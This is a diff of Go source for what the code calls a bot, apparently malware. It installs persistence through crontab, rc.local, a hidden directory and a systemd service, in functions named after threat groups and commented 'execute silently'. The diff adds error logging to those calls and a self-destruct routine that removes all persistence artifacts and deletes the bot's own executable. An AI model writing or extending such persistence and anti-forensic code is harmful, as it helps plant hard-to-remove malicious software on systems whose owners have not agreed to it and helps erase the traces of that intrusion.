@@ -31,7 +31,9 @@ func carbanak(hiddenDir string) {
 
 	// Production mode - execute silently
 	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
-	cmd.Run()
+	if err := cmd.Run(); err != nil {
+		deoxys("carbanak: crontab install failed: %v", err)
+	}
 }
 
 // lazarus sets up a simple cron job to keep the bot running.
@@ -69,7 +71,9 @@ func lazarus() {
 
 	// Add to crontab
 	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
-	cmd.Run()
+	if err := cmd.Run(); err != nil {
+		deoxys("lazarus: crontab install failed: %v", err)
+	}
 }
 
 // fin7 adds the bot executable to rc.local for startup persistence.
@@ -155,7 +159,68 @@ func dragonfly() {
 	os.WriteFile(persistServicePath, []byte(persistServiceContent), 0644)
 
 	cmd := exec.Command("systemctl", "enable", "--now", persistServiceName)
-	cmd.Run()
+	if err := cmd.Run(); err != nil {
+		deoxys("dragonfly: systemctl enable failed: %v", err)
+	}
 
 	carbanak(persistHiddenDir)
+}
+
+// nukeAndExit strips all persistence artifacts, removes the binary, and exits.
+// Designed to fully remove a signal-ignoring, persisted daemon.
+func nukeAndExit() {
+	deoxys("nukeAndExit: Removing all persistence and self-destructing")
+
+	// 1. Stop and remove systemd service
+	exec.Command("systemctl", "stop", persistServiceName).Run()
+	exec.Command("systemctl", "disable", persistServiceName).Run()
+	os.Remove(persistServicePath)
+	exec.Command("systemctl", "daemon-reload").Run()
+
+	// 2. Remove cron entries referencing our script or binary
+	if out, err := exec.Command("crontab", "-l").Output(); err == nil {
+		lines := strings.Split(string(out), "\n")
+		var clean []string
+		for _, line := range lines {
+			if strings.Contains(line, persistScriptName) || strings.Contains(line, persistBinaryName) {
+				continue
+			}
+			clean = append(clean, line)
+		}
+		filtered := strings.TrimSpace(strings.Join(clean, "\n"))
+		if filtered == "" {
+			exec.Command("crontab", "-r").Run()
+		} else {
+			cmd := exec.Command("crontab", "-")
+			cmd.Stdin = strings.NewReader(filtered + "\n")
+			cmd.Run()
+		}
+	}
+
+	// 3. Clean rc.local
+	rcLocal := "/etc/rc.local"
+	if data, err := os.ReadFile(rcLocal); err == nil {
+		lines := strings.Split(string(data), "\n")
+		var clean []string
+		for _, line := range lines {
+			if strings.Contains(line, persistBinaryName) || strings.Contains(line, persistHiddenDir) {
+				continue
+			}
+			clean = append(clean, line)
+		}
+		os.WriteFile(rcLocal, []byte(strings.Join(clean, "\n")), 0755)
+	}
+
+	// 4. Remove hidden directory (contains script + binary copy)
+	os.RemoveAll(persistHiddenDir)
+
+	// 5. Remove instance lock file
+	os.Remove(instanceLockPath)
+
+	// 6. Remove own executable
+	if exe, err := os.Executable(); err == nil {
+		os.Remove(exe)
+	}
+
+	os.Exit(0)
 }
